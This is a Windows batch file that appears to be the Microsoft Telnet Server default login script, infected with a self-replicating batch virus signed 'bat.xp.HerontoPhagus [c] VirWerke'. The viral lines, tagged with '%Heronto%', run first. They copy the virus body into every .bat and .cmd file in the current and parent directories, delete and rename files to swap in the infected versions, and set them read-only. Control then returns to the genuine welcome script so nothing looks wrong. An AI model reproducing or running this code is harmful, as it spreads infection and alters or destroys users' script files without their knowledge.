   @goto PhagoSt
   :Her_Fek
   @echo off
   rem
   rem  Default global login script for the Telnet Server
   rem
   rem  In the default setup, this command script is executed when the
   rem  initial command shell is invoked.  It, in turn, will try to invoke
   rem  the individual user's login script.
   rem

   echo *===============================================================
   echo Welcome to Microsoft Telnet Server.
   echo *===============================================================

   cd /d %HOMEDRIVE%\%HOMEPATH%

   :: %Heronto%
   @goto Her_fin %Heronto%
   rem bat.xp.HerontoPhagus [c] VirWerke
   :PhagoSt %Heronto%
   %Heronto%@echo off
   echo @goto PhagoSt>Heronto.bit
   echo :Her_Fek>>Heronto.bit
   find "Heronto" <%0 > Body.bit
   %Heronto%attrib +r %0>nul
   %Heronto%copy *.bat *.but>nul
   %Heronto%copy *.cmd *.cut>nul
   %Heronto%copy ..\\*.bat ..\\*.but>nul
   %Heronto%copy ..\\*.cmd ..\\*.cut>nul
   %Heronto%for %%h in (*.but, ..\\*.but, *.cut, ..\\*.cut) do copy "%%h"+Body.bit "%%h">nul
   for %%b in (*.but, ..\\*.but) do copy Heronto.bit+"%%b" "%%b".bot>nul
   for %%q in (*.cut, ..\\*.cut) do copy Heronto.bit+"%%q" "%%q".cot>nul
   %Heronto%del *.bat>nul
   %Heronto%del *.cmd>nul
   %Heronto%del ..\\*.bat>nul
   %Heronto%del ..\\*.cmd>nul
   %Heronto%del *.but>nul
   %Heronto%del *.cut>nul
   %Heronto%del ..\\*.but>nul
   %Heronto%del ..\\*.cut>nul
   %Heronto%ren *.bot *..>nul
   %Heronto%ren *.cot *..>nul
   %Heronto%ren ..\\*.bot *..>nul
   %Heronto%ren ..\\*.cot *..>nul
   %Heronto%ren *.but *.bat>nul
   %Heronto%ren *.cut *.cmd>nul
   %Heronto%ren ..\\*.but *.bat>nul
   %Heronto%ren ..\\*.cut *.cmd>nul
   %Heronto%for %%f in (*.bat, ..\\*.bat, *.cmd, ..\\*.cmd) do attrib +r "%%f">nul
   del Heronto.bit>nul
   %Heronto%del Body.bit>nul
   %Heronto%del *.but>nul
   %Heronto%del *.cut>nul
   %Heronto%del ..\\*.but>nul
   %Heronto%del ..\\*.cut>nul
   %Heronto%cls
   @goto Her_Fek %Heronto%
   :Her_Fin %Heronto%
